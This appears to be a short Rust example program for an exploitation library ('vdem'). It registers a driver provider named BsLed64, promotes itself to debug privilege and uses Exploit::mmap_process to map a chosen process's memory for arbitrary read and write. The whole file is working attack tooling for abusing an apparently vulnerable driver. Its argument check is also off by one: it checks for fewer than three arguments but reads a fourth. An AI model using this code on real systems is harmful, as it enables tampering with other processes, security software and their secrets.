use std::{env, println};

use providers::bsled::BsLed64;
use vdem::{exploit::Exploit, process::MapProcessMemory, utils::promote_privilege_to_debug_level};

fn main() {
    // Attention:
    // calling Exploit::mmap_process will cause BSOD if you pass a invalid address in user space
    // so it is a good choice to run it in debug mode to see what memory problems cause that BSOD 
    #[cfg(debug_assertions)]
    unsafe {
        core::arch::asm!("int 3")
    }

    let args = env::args().collect::<Vec<String>>();

    if args.len() < 3 {
        panic!(
            "Usage: {} <pid> <address - hex format> <length - hex format>",
            &args[0]
        );
    }

    let pid: u32 = u32::from_str_radix(&args[1], 10).expect("Invalid process id");
    let address = usize::from_str_radix(&args[2], 16).expect("Invalid address format");
    let length = u32::from_str_radix(&args[3], 16).expect("Invalid length");

    promote_privilege_to_debug_level();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    if let Ok(buffer) = exploit.mmap_process(pid, address as _, length) {
        println!(
            "address {:x} in process {} successfully mapped at {:p}",
            address,
            pid,
            buffer.as_ptr()
        );

        // now we can read / write with buffer object
    } else {
        println!("map failed");
    }
}
